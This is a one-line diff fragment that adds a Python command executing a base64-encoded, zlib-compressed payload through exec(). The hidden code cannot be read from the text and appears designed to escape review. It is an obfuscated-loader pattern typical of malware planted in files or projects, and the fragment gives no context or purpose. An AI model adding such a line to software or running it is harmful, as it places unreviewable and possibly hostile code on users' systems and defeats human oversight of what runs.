@@ -1,0 +1,1 @@
+python -c "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNrLzC3ILypRKM5Pzk4tUYABHRijuDSpoCg/ObW4GFMuHyJmDZfJyC8usVUyNDXRMzTWMzQz1jM2VkJTArLM1hwI0MSLbSEu0INQGlCeo1u8p59rCBZ3QeSD/Z2944NDglwdfTXRTdRLzs/LS00u0dAAuQvTCJBTNNF15RfrpZQWGGkU66Vl5qTm5WtoYmo0IEeTITmajNA1FdgiIkQvOTEnR0NJPykzT784Q0kTAOnvaAw=')[0])))"
